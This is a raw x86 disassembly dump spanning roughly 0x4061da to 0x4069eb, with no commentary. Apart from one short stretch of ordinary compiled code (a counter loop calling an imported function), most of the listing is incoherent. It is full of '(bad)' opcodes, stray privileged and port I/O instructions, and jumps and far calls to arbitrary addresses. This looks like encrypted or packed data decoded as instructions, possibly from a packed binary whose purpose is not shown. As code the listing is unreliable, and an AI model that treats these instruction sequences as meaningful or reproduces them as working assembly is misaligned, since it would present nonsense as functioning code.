  4061da:	out    0x11,eax
  4061dc:	loop   0x4061cc
  4061de:	xchg   ebp,eax
  4061df:	push   edi
  4061e0:	mov    WORD PTR [ebx+0x7d5c3118],fs
  4061e6:	(bad)  
  4061e7:	iret   
  4061e8:	jp     0x40620a
  4061ea:	idiv   BYTE PTR [ecx-0x7a]
  4061ed:	call   FWORD PTR [edi+0x79b342b4]
  4061f3:	mov    ebp,DWORD PTR [edx-0xcf3cd63]
  4061f9:	std    
  4061fa:	(bad)  
  4061fb:	loop   0x40620b
  4061fd:	enter  0x6efb,0xf4
  406201:	pusha  
  406202:	mov    al,0xd3
  406204:	mov    dh,0x25
  406206:	pop    es
  406207:	dec    ebp
  406208:	nop
  406209:	shl    DWORD PTR [edx+eiz*1],1
  40620c:	add    dl,BYTE PTR [edi]
  40620e:	jne    0x40623f
  406210:	cmp    eax,0x94b3c1a0
  406215:	cli    
  406216:	mov    eax,ds:0x78b54564
  40621b:	mov    edi,0x2742b977
  406220:	je     0x4061ea
  406222:	inc    edx
  406223:	adc    ebp,DWORD PTR [ebp+0x5d674f8e]
  406229:	data16 cmp BYTE PTR [ecx-0x48],0xaa
  40622e:	in     al,dx
  40622f:	dec    eax
  406230:	pop    es
  406231:	or     BYTE PTR [eax],cl
  406233:	cmp    edx,ebx
  406235:	mov    bl,0x52
  406237:	fcompp 
  406239:	fisub  WORD PTR [ebx-0x2e]
  40623c:	imul   esi,DWORD PTR [ebx+0x4c939618],0x43
  406243:	arpl   WORD PTR [ebp-0x2f],bx
  406246:	shr    DWORD PTR [ebx],1
  406248:	jge    0x40625d
  40624a:	test   DWORD PTR [eax-0x57],eax
  40624d:	fs jle 0x40625b
  406250:	out    dx,eax
  406251:	xor    ebp,DWORD PTR ds:0x43137f99
  406257:	ret    
  406258:	jecxz  0x406213
  40625a:	mov    ds:0x28304e43,eax
  40625f:	and    al,bh
  406261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406262:	stos   DWORD PTR es:[edi],eax
  406263:	jle    0x40623d
  406265:	imul   edx,DWORD PTR [edx+0x3a58236a],0x52
  40626c:	aam    0x7b
  40626e:	retf   0xe08e
  406271:	aas    
  406272:	sbb    eax,0xe98e4c50
  406277:	in     al,dx
  406278:	adc    eax,0x20655589
  40627d:	lea    ebp,[esi-0x1a1d0888]
  406283:	or     eax,0x61d6abfd
  406288:	loop   0x4062dd
  40628a:	or     dl,BYTE PTR [edi-0x58]
  40628d:	jp     0x406261
  40628f:	jmp    0x4062c4
  406291:	and    DWORD PTR [eax+0x7556fd71],ecx
  406297:	int    0x1a
  406299:	xchg   ebx,eax
  40629a:	cli    
  40629b:	shl    DWORD PTR [esi],1
  40629d:	jnp    0x406287
  40629f:	adc    al,0x74
  4062a1:	nop
  4062a2:	(bad)  
  4062a3:	cmp    al,0x56
  4062a5:	mov    esp,0x33fd8c36
  4062aa:	daa    
  4062ab:	jns    0x406269
  4062ad:	cld    
  4062ae:	sub    ah,al
  4062b0:	push   0xffffffbd
  4062b2:	int    0xb4
  4062b4:	into   
  4062b5:	mov    ds:0x6bd981a6,eax
  4062ba:	cmp    BYTE PTR [ebx-0x65883f0a],ch
  4062c0:	sub    eax,0x80ade3ab
  4062c5:	push   edi
  4062c6:	ret    
  4062c7:	xor    bh,bl
  4062c9:	loopne 0x406260
  4062cb:	mov    ds:0x572cc5b2,eax
  4062d0:	bound  esp,QWORD PTR [esi]
  4062d2:	in     al,dx
  4062d3:	xchg   edx,eax
  4062d4:	lods   eax,DWORD PTR ds:[esi]
  4062d5:	sub    esp,DWORD PTR ds:0x6f9d8be5
  4062db:	stos   BYTE PTR es:[edi],al
  4062dc:	pop    edx
  4062dd:	push   edx
  4062de:	push   ebx
  4062df:	cmp    al,0x6b
  4062e1:	rcl    DWORD PTR [ebp-0x69e52d57],0xb1
  4062e8:	fist   DWORD PTR [esi]
  4062ea:	clc    
  4062eb:	mov    eax,ds:0xefd51847
  4062f0:	and    al,0xf
  4062f2:	mov    eax,ds:0x57f1aca3
  4062f7:	mov    dl,BYTE PTR [edx]
  4062f9:	add    BYTE PTR ds:0x2f9ada97,dh
  4062ff:	jmp    0xf716a619
  406304:	inc    edx
  406305:	xor    al,BYTE PTR ds:0xa9cec224
  40630b:	sbb    al,BYTE PTR [ebx]
  40630d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40630e:	cdq    
  40630f:	pop    edx
  406310:	push   eax
  406311:	mov    DWORD PTR [edi+0x6a],edi
  406314:	lahf   
  406315:	retf   
  406316:	adc    DWORD PTR [edi-0x5e5acedc],0xdc6133f3
  406320:	inc    esi
  406321:	add    DWORD PTR [esi-0xb],ecx
  406324:	inc    ebx
  406325:	fld    QWORD PTR [ecx+0x2481ddb3]
  40632b:	enter  0x5b6e,0xc
  40632f:	mov    edi,0xb7a5a152
  406334:	pushf  
  406335:	aad    0x87
  406337:	in     al,dx
  406338:	pop    es
  406339:	ss stos BYTE PTR es:[edi],al
  40633b:	test   eax,0xe881be5a
  406340:	or     ch,cl
  406342:	imul   ebx,DWORD PTR [ebx],0xffffffc0
  406345:	pusha  
  406346:	jg     0x4063a4
  406348:	jle    0x40632d
  40634a:	test   BYTE PTR [eax-0xc5614c6],ah
  406350:	sub    al,0xb
  406352:	and    eax,0x403910d1
  406357:	xor    DWORD PTR [eax],0x9c771f4
  40635d:	icebp  
  40635e:	adc    dl,BYTE PTR [ebp-0x66e34a76]
  406364:	or     dl,0x9c
  406367:	mov    ah,0xf9
  406369:	fidiv  DWORD PTR [ebp-0x6f83f64b]
  40636f:	arpl   WORD PTR [edx-0x73],dx
  406372:	pop    ds
  406373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406374:	enter  0x4893,0x34
  406378:	lock mov ds:0x24c2b37,eax
  40637e:	or     bl,BYTE PTR [edi]
  406380:	call   0x820a:0x3b018f5b
  406387:	and    DWORD PTR [ebx+0x76],edx
  40638a:	addr16 enter 0x24ef,0x4
  40638f:	pushf  
  406390:	or     DWORD PTR [edx],ebp
  406392:	pusha  
  406393:	(bad)  
  406394:	push   ecx
  406395:	sub    BYTE PTR [esi-0x25],dh
  406398:	sar    DWORD PTR [ebp-0x7d],1
  40639b:	(bad)  
  40639c:	in     eax,0x42
  40639e:	aaa    
  40639f:	add    DWORD PTR [eax-0x1e2cfe],edx
  4063a5:	lods   eax,DWORD PTR ds:[esi]
  4063a6:	pop    edi
  4063a7:	xlat   BYTE PTR ds:[ebx]
  4063a8:	stos   DWORD PTR es:[edi],eax
  4063a9:	adc    al,0xc4
  4063ab:	mov    ch,0x2c
  4063ad:	and    edi,ecx
  4063af:	in     al,dx
  4063b0:	xor    eax,0xf9c33c4b
  4063b5:	or     al,BYTE PTR [ecx]
  4063b7:	sahf   
  4063b8:	push   ss
  4063b9:	cdq    
  4063ba:	lea    ecx,[edx+0x8]
  4063bd:	call   0x4a76eae2
  4063c2:	loopne 0x406359
  4063c4:	psubq  mm3,QWORD PTR [edi-0x33f3aeb0]
  4063cb:	loope  0x4063ef
  4063cd:	pop    es
  4063ce:	pop    es
  4063cf:	push   esp
  4063d0:	pop    ds
  4063d1:	cmp    esp,DWORD PTR [eax-0x1a]
  4063d4:	mov    WORD PTR [ebx-0x21],cs
  4063d7:	addr16 ss pop ss
  4063da:	lods   al,BYTE PTR ds:[esi]
  4063db:	xchg   ebp,eax
  4063dc:	pop    ss
  4063dd:	sub    ah,dh
  4063df:	jecxz  0x4063bb
  4063e1:	add    esp,DWORD PTR [ecx+0x5b]
  4063e4:	fmul   st(0),st
  4063e6:	xor    eax,0x8832f381
  4063eb:	les    ebx,FWORD PTR [ebx-0x6ca7cc39]
  4063f1:	mov    eax,ds:0x3e615e1
  4063f6:	js     0x40642c
  4063f8:	pusha  
  4063f9:	sub    DWORD PTR [ebx-0x6ecc8b83],ecx
  4063ff:	adc    dl,BYTE PTR ds:0xebdd4dcc
  406405:	pop    eax
  406406:	cs enter 0xae9d,0xe9
  40640b:	test   al,0x54
  40640d:	inc    ebx
  40640e:	test   edi,0x18f55db9
  406414:	mov    ebp,0xe4eee652
  406419:	push   eax
  40641a:	rcr    BYTE PTR [ebx],0xd7
  40641d:	and    eax,0x89917a87
  406422:	ret    
  406423:	sub    al,0xac
  406425:	popa   
  406426:	cmp    BYTE PTR [ebx],al
  406428:	cld    
  406429:	addr16 fwait
  40642b:	loopne 0x406489
  40642d:	test   eax,0xeec74057
  406432:	mov    ch,0x0
  406434:	and    DWORD PTR [ebx+0x3fea30b1],ebx
  40643a:	add    DWORD PTR [ecx-0x6f],esi
  40643d:	push   ebx
  40643e:	cmp    ch,BYTE PTR [ecx+0x1e429da7]
  406444:	daa    
  406445:	int    0xa7
  406447:	sub    BYTE PTR [edx-0x2a],bl
  40644a:	aaa    
  40644b:	in     al,0x46
  40644d:	mov    edx,0xf52fa257
  406452:	adc    ebp,0xffffff91
  406455:	sub    DWORD PTR [edx],ebx
  406457:	sqrtps xmm3,XMMWORD PTR [eax+0x5c099b79]
  40645e:	lahf   
  40645f:	adc    dh,BYTE PTR [ebp-0x43f96c0c]
  406465:	mov    esp,0x693984e
  40646a:	ret    0xfb39
  40646d:	jo     0x406436
  40646f:	adc    al,0xc7
  406471:	adc    DWORD PTR [ebx+0xa52f51b],ecx
  406477:	jecxz  0x406456
  406479:	pushf  
  40647a:	rcl    BYTE PTR [edx+0x3b05ce39],0x3a
  406481:	nop
  406482:	(bad)  
  406483:	das    
  406484:	test   eax,ebx
  406486:	or     edx,DWORD PTR [ebp-0x7a222c50]
  40648c:	test   ebp,ebp
  40648e:	jmp    0x406435
  406490:	cmp    BYTE PTR [ebp-0x23],ch
  406493:	ror    BYTE PTR [edx+ebp*8-0x43458878],cl
  40649a:	(bad)  
  40649c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40649d:	fwait
  40649e:	pop    edx
  40649f:	out    dx,al
  4064a0:	sti    
  4064a1:	mov    eax,ds:0xffd5abb7
  4064a6:	aas    
  4064a7:	xchg   BYTE PTR [ebp+0x7700cf2a],cl
  4064ad:	add    ebx,DWORD PTR [edx]
  4064af:	pusha  
  4064b0:	xchg   esi,eax
  4064b1:	xor    eax,0x72af63ca
  4064b6:	push   ebx
  4064b7:	sub    al,0xbb
  4064b9:	repz dec esi
  4064bb:	fisub  WORD PTR [edx+ebx*8-0x6f]
  4064bf:	add    DWORD PTR [esi],0xffffff88
  4064c2:	jecxz  0x40652b
  4064c4:	add    ch,BYTE PTR [ebx]
  4064c6:	data16 aam 0x52
  4064c9:	frstor [eax+ebp*8+0x57345445]
  4064d0:	test   BYTE PTR [eax-0x342cc856],dl
  4064d6:	adc    bl,BYTE PTR [edi-0x5d]
  4064d9:	nop
  4064da:	jge    0x406525
  4064dc:	xchg   ebx,eax
  4064dd:	mov    al,0x97
  4064df:	sar    ah,0x78
  4064e2:	in     eax,dx
  4064e3:	inc    edi
  4064e4:	xchg   ecx,eax
  4064e5:	cmp    dl,BYTE PTR [edi-0x15]
  4064e8:	int    0x52
  4064ea:	and    edx,DWORD PTR [ebp+0x853f200]
  4064f0:	hlt    
  4064f1:	push   ecx
  4064f2:	pop    eax
  4064f3:	sub    bl,dh
  4064f5:	pop    eax
  4064f6:	sbb    BYTE PTR [ebx+0x22],0x7d
  4064fa:	and    BYTE PTR [eax-0x65],ah
  4064fd:	pop    ebx
  4064fe:	xchg   ebx,eax
  4064ff:	xor    BYTE PTR [esi-0x1],al
  406502:	jl     0x4064ca
  406504:	mov    ds:0xe3435fb0,al
  406509:	xor    BYTE PTR [eax-0x64],bl
  40650c:	push   cs
  40650d:	dec    eax
  40650e:	cmp    ebp,0xffffff97
  406511:	add    cl,cl
  406513:	lock outs dx,BYTE PTR ds:[esi]
  406515:	mov    ebx,DWORD PTR [ebx+eax*8]
  406518:	mov    DWORD PTR [ebx],ebx
  40651a:	inc    esi
  40651b:	jp     0x40652c
  40651d:	and    eax,0xa7976599
  406522:	loop   0x40658b
  406524:	xchg   ebp,eax
  406525:	test   cl,ah
  406527:	ins    BYTE PTR es:[edi],dx
  406528:	and    dl,cl
  40652a:	pop    ebp
  40652b:	mov    cl,BYTE PTR [edi+0x41]
  40652e:	push   0x33a2704e
  406533:	rcr    BYTE PTR [ebx+ebp*4],cl
  406536:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  406538:	dec    ebp
  406539:	outs   dx,DWORD PTR ds:[esi]
  40653a:	ss inc edi
  40653c:	in     al,0x1f
  40653e:	pop    ebx
  40653f:	jbe    0x40659b
  406541:	imul   esi,ebp,0x68
  406544:	icebp  
  406545:	and    al,0xa9
  406547:	or     BYTE PTR [eax],dl
  406549:	int    0xb8
  40654b:	inc    esp
  40654c:	inc    ecx
  40654d:	arpl   WORD PTR [edi+0x3effac2f],dx
  406553:	out    dx,eax
  406554:	or     ah,BYTE PTR [ebx+0x68]
  406557:	add    BYTE PTR [eax-0x6dc7d429],0xb1
  40655e:	loopne 0x4064ee
  406560:	clc    
  406561:	xor    DWORD PTR [ecx-0x75667fe],eax
  406567:	pop    edx
  406568:	das    
  406569:	inc    ebp
  40656a:	jno    0x406522
  40656c:	xor    al,0x4d
  40656e:	jl     0x406520
  406570:	mov    DWORD PTR ds:0xc91c6647,edi
  406576:	and    esp,esi
  406578:	lea    ebx,[eax+eiz*1+0x59402245]
  40657f:	jb     0x4065d9
  406581:	pop    edi
  406582:	jo     0x406595
  406584:	in     eax,0xec
  406586:	jle    0x4065d8
  406588:	cdq    
  406589:	push   esp
  40658a:	ficom  DWORD PTR [edx-0x1c]
  40658d:	sub    DWORD PTR gs:[eax],edx
  406590:	cmp    DWORD PTR [edi-0x59587d0f],ebp
  406596:	in     eax,0x8e
  406598:	cmp    eax,0x73c15e8
  40659d:	cli    
  40659e:	add    ecx,DWORD PTR [eax]
  4065a0:	mov    ebp,0xdc458d49
  4065a5:	movzx  ecx,WORD PTR ds:0x43453b
  4065ac:	and    ecx,DWORD PTR ds:0x434473
  4065b2:	mov    DWORD PTR ds:0x43453b,ecx
  4065b8:	mov    DWORD PTR [ebp-0x28],eax
  4065bb:	adc    DWORD PTR ds:0x43447f,ecx
  4065c1:	mov    eax,DWORD PTR [ebp+0x8]
  4065c4:	sbb    ecx,DWORD PTR ds:0x43458f
  4065ca:	mov    DWORD PTR [ebp-0x20],eax
  4065cd:	push   ebx
  4065ce:	sub    DWORD PTR ds:0x434477,ebx
  4065d4:	lea    eax,[ebp-0x18]
  4065d7:	mov    DWORD PTR [ebp-0x1c],eax
  4065da:	xor    DWORD PTR ds:0x4344cf,edx
  4065e0:	mov    eax,DWORD PTR [ebp-0x1c]
  4065e3:	and    DWORD PTR ds:0x43446b,0x0
  4065ed:	mov    ecx,DWORD PTR ds:0x43446b
  4065f3:	inc    ecx
  4065f4:	mov    DWORD PTR ds:0x43446b,ecx
  4065fa:	cmp    DWORD PTR ds:0x43446b,0x1e
  406601:	jne    0x40661a
  406607:	push   DWORD PTR [ebp-0x14]
  40660a:	push   0x4344c7
  40660f:	push   0x43479f
  406614:	call   DWORD PTR ds:0x413400
  40661a:	cmp    DWORD PTR ds:0x43446b,0x1c
  406621:	jb     0x4065ed
  406627:	jmp    0x406a15
  40662c:	call   0x70d95cef
  406631:	mov    al,0x70
  406633:	dec    esi
  406634:	mov    BYTE PTR [ecx],dh
  406636:	push   esi
  406637:	inc    esp
  406638:	frstor [ebx+0x3b4c7cf1]
  40663e:	jle    0x4066be
  406640:	dec    edi
  406641:	jns    0x4066c1
  406643:	jle    0x4065d0
  406645:	jg     0x4066c5
  406647:	push   ss
  406648:	loop   0x4066b9
  40664a:	mov    ebp,0xb3fb521d
  40664f:	inc    BYTE PTR [esi-0xe]
  406652:	gs pop ebx
  406654:	sub    eax,0x730646d1
  406659:	into   
  40665a:	pop    esi
  40665b:	repnz aaa 
  40665d:	loop   0x4066c9
  40665f:	outs   dx,DWORD PTR ds:[esi]
  406660:	push   edi
  406661:	(bad)  
  406663:	(bad)  
  406664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406665:	inc    esp
  406666:	bnd call 0x6007f344
  40666c:	retf   0x5482
  40666f:	or     DWORD PTR [ebp-0x3e],edi
  406672:	jbe    0x406695
  406674:	pop    ds
  406675:	(bad)  
  406676:	ret    0xacdc
  406679:	push   ds
  40667a:	(bad)  
  40667c:	cmp    edx,DWORD PTR [edi]
  40667e:	mov    ah,0xfe
  406680:	pop    ecx
  406681:	inc    esi
  406682:	mov    ebx,0x648f2723
  406687:	data16 test al,0xc6
  40668a:	adc    al,0xc1
  40668c:	das    
  40668d:	xor    BYTE PTR [esi],bh
  40668f:	fsub   QWORD PTR [eax-0x61]
  406692:	inc    ecx
  406693:	aaa    
  406694:	pop    eax
  406696:	inc    ebp
  406697:	adc    eax,0xda04de08
  40669c:	xlat   BYTE PTR ds:[ebx]
  40669d:	in     al,dx
  40669e:	jmp    0x7597:0xb40dbb31
  4066a5:	hlt    
  4066a6:	aas    
  4066a7:	push   ebx
  4066a8:	pop    ebx
  4066a9:	rcr    DWORD PTR [edx],cl
  4066ab:	xor    al,0xcf
  4066ad:	mov    ah,0x1b
  4066af:	test   DWORD PTR [ecx+ebp*4-0x45],edx
  4066b3:	mov    esp,0xa0e603d1
  4066b8:	mul    DWORD PTR [bx+si-0x6f62]
  4066bd:	mov    ds:0x1c16b074,al
  4066c2:	arpl   si,di
  4066c4:	jns    0x40668a
  4066c6:	shl    ebp,0x78
  4066c9:	shr    DWORD PTR [eax+esi*1-0x61],0xe1
  4066ce:	cmp    DWORD PTR [edx+edi*2+0x33bf78f8],ebx
  4066d5:	sti    
  4066d6:	xor    BYTE PTR [edi+0x72],0x17
  4066da:	and    ebp,eax
  4066dc:	stos   DWORD PTR es:[edi],eax
  4066dd:	arpl   WORD PTR ds:[edi],bx
  4066e0:	jo     0x40669a
  4066e2:	test   BYTE PTR [edi+0x49f07522],0xba
  4066e9:	xchg   ecx,ebp
  4066eb:	sete   ch
  4066ee:	call   0xf93d:0x65c9df06
  4066f5:	dec    eax
  4066f6:	mov    ch,0xe3
  4066f8:	push   ebx
  4066f9:	jge    0x406728
  4066fb:	cmp    DWORD PTR [edi+0x2d],esi
  4066fe:	fisttp QWORD PTR gs:[edi-0x50]
  406702:	lods   al,BYTE PTR ds:[esi]
  406703:	pop    esi
  406704:	and    esp,DWORD PTR [eax+ebp*8+0x5f]
  406708:	not    BYTE PTR [ebp+0x68]
  40670b:	inc    edx
  40670c:	dec    edi
  40670d:	out    0xed,eax
  40670f:	(bad)  
  406710:	cmc    
  406711:	adc    ebp,DWORD PTR [edi+0x4d71c781]
  406717:	push   edi
  406718:	or     BYTE PTR [edi+0x28fdece7],bl
  40671e:	ins    DWORD PTR es:[edi],dx
  40671f:	jecxz  0x4066fb
  406721:	(bad)  
  406723:	call   0xa542:0x562cd55f
  40672a:	in     eax,0x6e
  40672c:	in     eax,dx
  40672d:	outs   dx,DWORD PTR ds:[esi]
  40672e:	call   0x87c0:0x7bda81d0
  406735:	js     0x406769
  406737:	jo     0x406789
  406739:	mov    ds:0xd6d6be1,eax
  40673e:	mov    bh,0xbc
  406740:	mov    ebx,0x4a49682b
  406745:	aaa    
  406746:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406747:	mov    dl,0x6e
  406749:	push   ss
  40674a:	je     0x406757
  40674c:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40674e:	push   cs
  40674f:	mov    esp,0xccd1faa2
  406754:	mov    ah,0xed
  406756:	push   cs
  406757:	dec    esp
  406758:	cs sub bl,dl
  40675b:	fld    DWORD PTR [ecx]
  40675d:	div    bh
  40675f:	movlps xmm3,QWORD PTR [ebx]
  406762:	ret    
  406763:	and    ebp,eax
  406765:	mov    al,ds:0x600987c3
  40676a:	aas    
  40676b:	dec    esp
  40676c:	jge    0x4067b2
  40676e:	sti    
  40676f:	mov    esi,0x4d60c63f
  406774:	scas   eax,DWORD PTR es:[edi]
  406775:	add    al,bl
  406777:	pop    eax
  406778:	sar    BYTE PTR [eax],0xea
  40677b:	pop    esp
  40677c:	enter  0x749,0xca
  406780:	ins    DWORD PTR es:[edi],dx
  406781:	cmp    edi,DWORD PTR [ebx+esi*2+0x23]
  406785:	sbb    BYTE PTR es:[edx+eiz*2+0x0],0xbe
  40678b:	daa    
  40678c:	stc    
  40678d:	leave  
  40678e:	or     dh,BYTE PTR [eax+ebx*1]
  406791:	cmp    cl,ch
  406793:	inc    edi
  406794:	cli    
  406795:	lahf   
  406796:	test   al,0x40
  406798:	in     eax,0xee
  40679a:	fidivr WORD PTR [esi-0x35e8bdba]
  4067a0:	and    cl,al
  4067a2:	pusha  
  4067a3:	cwde   
  4067a4:	in     al,0xb
  4067a6:	jmp    0x40673d
  4067a8:	inc    edx
  4067a9:	dec    edx
  4067aa:	aam    0x3d
  4067ac:	mov    bl,0xe4
  4067ae:	rcr    DWORD PTR [edi-0x14a95a15],0x39
  4067b5:	call   0x74688ac0
  4067ba:	popf   
  4067bb:	cmp    DWORD PTR [esi],eax
  4067bd:	push   cs
  4067be:	(bad)  
  4067bf:	lods   al,BYTE PTR ds:[esi]
  4067c0:	push   esp
  4067c1:	vmread DWORD PTR [eax-0x37],edx
  4067c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067c6:	jecxz  0x4067fa
  4067c8:	jp     0x40675f
  4067ca:	and    DWORD PTR ds:[edi+0x2d941fcb],0x42
  4067d2:	sbb    eax,0xb36207f4
  4067d7:	(bad)  
  4067d8:	nop
  4067d9:	pop    ds
  4067da:	push   eax
  4067db:	push   esp
  4067dc:	mov    edi,0x5c77de7c
  4067e1:	sub    al,0x83
  4067e3:	das    
  4067e4:	pop    ds
  4067e5:	(bad)  
  4067e6:	fild   QWORD PTR [esi]
  4067e8:	test   BYTE PTR [edx-0x6e4cefcb],0x7c
  4067ef:	xchg   edx,eax
  4067f0:	inc    ebx
  4067f1:	push   eax
  4067f2:	xor    BYTE PTR [ebp-0x1c],0x98
  4067f6:	jae    0x406829
  4067f8:	test   DWORD PTR [ecx-0x54],esi
  4067fb:	push   cs
  4067fc:	sbb    DWORD PTR [esi-0x6d],esi
  4067ff:	xchg   esp,eax
  406800:	xchg   ebp,eax
  406801:	push   0xd37dea70
  406806:	into   
  406807:	fs call 0xa8889220
  40680d:	fwait
  40680e:	xor    ecx,DWORD PTR [edi+ecx*8-0x62]
  406812:	cmp    edx,0x1ac6bb6
  406818:	fisubr WORD PTR [esi+0x4fb6808d]
  40681e:	push   esi
  40681f:	pop    ebp
  406820:	dec    eax
  406821:	fnstsw ax
  406823:	fistp  DWORD PTR [edi-0x32]
  406826:	dec    ebx
  406827:	mov    ah,0x18
  406829:	mov    eax,ds:0xcb59cf8e
  40682e:	pusha  
  40682f:	cmp    eax,0x2117df56
  406834:	leave  
  406835:	adc    eax,0xd3e99b19
  40683a:	sbb    esi,esp
  40683c:	jecxz  0x4067ff
  40683e:	mov    dh,0x5b
  406840:	into   
  406841:	cld    
  406842:	je     0x4068af
  406844:	test   al,0x2c
  406846:	mov    esi,0x4ece3f05
  40684b:	or     BYTE PTR [esi],0x3b
  40684e:	ss dec edi
  406850:	mov    edi,0x80f24775
  406855:	and    DWORD PTR [ebp-0x3b],eax
  406858:	test   eax,0x939c6a97
  40685d:	arpl   WORD PTR [esi],ax
  40685f:	jg     0x4067e7
  406861:	retf   
  406862:	call   0x812a7e59
  406867:	std    
  406868:	mov    dl,ch
  40686a:	pop    ds
  40686b:	sbb    bh,bl
  40686d:	retf   
  40686e:	add    edx,DWORD PTR [eax+0x56]
  406871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406872:	inc    DWORD PTR [edx]
  406874:	test   BYTE PTR [edx-0x4a],dl
  406877:	inc    esp
  406878:	mov    edi,0x88cd457f
  40687d:	push   0x85c3e6fa
  406882:	adc    al,BYTE PTR [ebp+0x33]
  406885:	cmpxchg DWORD PTR [ecx-0x7b],edx
  406889:	lahf   
  40688a:	jecxz  0x40683a
  40688c:	pop    eax
  40688d:	xchg   ebx,eax
  40688e:	sbb    eax,esp
  406890:	loopne 0x406869
  406892:	fistp  WORD PTR [edi-0x57]
  406895:	fisttp QWORD PTR [ebx+0x532df82c]
  40689b:	push   ebx
  40689c:	daa    
  40689d:	retf   0x2d43
  4068a0:	dec    edx
  4068a1:	clc    
  4068a2:	test   eax,0xf8a8713f
  4068a7:	jg     0x4068e6
  4068a9:	sub    al,0xf6
  4068ab:	mul    DWORD PTR [ebx-0xd]
  4068ae:	clc    
  4068af:	aad    0xcd
  4068b1:	lea    ecx,[ecx+0xa]
  4068b4:	js     0x40683e
  4068b6:	test   al,0xfd
  4068b8:	sbb    edi,ebx
  4068ba:	in     eax,0xf2
  4068bc:	out    0x24,eax
  4068be:	(bad)  
  4068bf:	sti    
  4068c0:	jno    0x4068f8
  4068c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068c3:	sbb    DWORD PTR [esi+0x6f],0xffffffe5
  4068c7:	jl     0x4068d8
  4068c9:	mov    DWORD PTR ds:0x3b7d7f02,esi
  4068cf:	(bad)  
  4068d0:	mov    BYTE PTR [edx+0x52],dl
  4068d3:	mov    al,ds:0x44071552
  4068d8:	xchg   edi,eax
  4068d9:	dec    edi
  4068da:	push   edi
  4068db:	add    BYTE PTR [ebx],0x43
  4068de:	or     BYTE PTR [edx-0x3c],dl
  4068e1:	mov    bl,0x8d
  4068e3:	les    edx,FWORD PTR [edi+eiz*8+0x54]
  4068e7:	push   es
  4068e8:	pop    ss
  4068e9:	ss push eax
  4068eb:	lods   eax,DWORD PTR ds:[esi]
  4068ec:	pop    edi
  4068ed:	loope  0x40690c
  4068ef:	inc    ebx
  4068f0:	bound  edx,QWORD PTR [edx+0x2a]
  4068f3:	(bad)  
  4068f4:	std    
  4068f5:	(bad)  
  4068f6:	push   ds
  4068f7:	test   ebx,eax
  4068f9:	repnz mov bl,0x6e
  4068fc:	push   eax
  4068fd:	pop    esp
  4068fe:	inc    edx
  4068ff:	inc    edx
  406900:	call   0x5709:0x8cd99bf2
  406907:	push   es
  406908:	rcr    ch,1
  40690a:	lock addr16 test ecx,0xe3d3db5d
  406912:	sbb    al,0x48
  406914:	pushf  
  406915:	pop    eax
  406916:	jp     0x4068b8
  406918:	retf   
  406919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40691a:	jne    0x4068c9
  40691c:	xor    DWORD PTR [eax],edi
  40691e:	inc    esp
  40691f:	hlt    
  406920:	(bad)  
  406921:	fs scas eax,DWORD PTR es:[edi]
  406923:	fist   DWORD PTR [esi]
  406925:	fcomi  st,st(4)
  406927:	mov    ecx,0x118a335c
  40692c:	stos   DWORD PTR es:[edi],eax
  40692d:	sbb    eax,0xa9246a35
  406932:	add    esp,DWORD PTR [si]
  406935:	(bad)  
  406937:	xor    DWORD PTR [ecx+edi*2],esi
  40693a:	fwait
  40693b:	(bad)  
  40693c:	std    
  40693d:	iret   
  40693e:	jp     0x406949
  406940:	cwde   
  406941:	jno    0x4068d7
  406943:	test   DWORD PTR [eax+edi*8+0x1b45dd71],edx
  40694a:	es in  eax,0xd
  40694d:	mov    ecx,0xcb65559e
  406952:	das    
  406953:	push   eax
  406954:	js     0x4069c9
  406956:	data16 fsubrp st(7),st
  406959:	nop
  40695a:	int    0x10
  40695c:	test   al,0x4b
  40695e:	das    
  40695f:	jno    0x406996
  406961:	(bad)  
  406963:	out    0xd0,al
  406965:	int    0x79
  406967:	ret    0x4dfc
  40696a:	aas    
  40696b:	and    al,0xd1
  40696d:	stc    
  40696e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40696f:	imul   esp,DWORD PTR [ecx-0x2fe7c4e6],0xfffffff6
  406976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406977:	adc    ecx,DWORD PTR ds:0x2d6df515
  40697d:	add    bh,ch
  40697f:	(bad)  
  406980:	cmp    eax,0xae1bdb1a
  406985:	add    DWORD PTR ds:0xce7a17fa,edx
  40698b:	add    bh,dh
  40698d:	cld    
  40698e:	stc    
  40698f:	pop    ss
  406990:	fstp   QWORD PTR [eax-0x4bfc91e1]
  406996:	push   ebp
  406997:	sbb    BYTE PTR [esi-0xc4f932e],0x61
  40699e:	aam    0xa5
  4069a0:	cwde   
  4069a1:	iret   
  4069a2:	push   ebp
  4069a3:	mov    al,ds:0x86252580
  4069a8:	inc    ebp
  4069a9:	dec    ebx
  4069aa:	fcom   DWORD PTR [ebx]
  4069ac:	jo     0x406a26
  4069ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069af:	inc    ecx
  4069b0:	mov    ecx,0x4022269b
  4069b5:	outs   dx,BYTE PTR ds:[esi]
  4069b6:	xor    eax,0x8e365c6
  4069bb:	das    
  4069bc:	loopne 0x4069b9
  4069be:	pop    ebp
  4069bf:	mov    DWORD PTR [ecx-0x3d],esp
  4069c2:	lods   al,BYTE PTR ds:[esi]
  4069c3:	test   DWORD PTR [edi-0x7363d3a8],edi
  4069c9:	dec    ebp
  4069ca:	cmp    eax,0x825fbe1d
  4069cf:	mov    dh,0x17
  4069d1:	(bad)  
  4069d2:	mov    dl,BYTE PTR [edi+0x8]
  4069d5:	xlat   BYTE PTR ds:[ebx]
  4069d6:	jmp    0x4069c6
  4069d8:	push   cs
  4069d9:	mov    ecx,0x5af899bf
  4069de:	xor    al,0xe1
  4069e0:	dec    edx
  4069e1:	sar    BYTE PTR [ecx],1
  4069e3:	xor    eax,DWORD PTR [ebx+0x7742ac4c]
  4069e9:	inc    esp
  4069ea:	pushf  
  4069eb:	mov    esp,0x225953f1
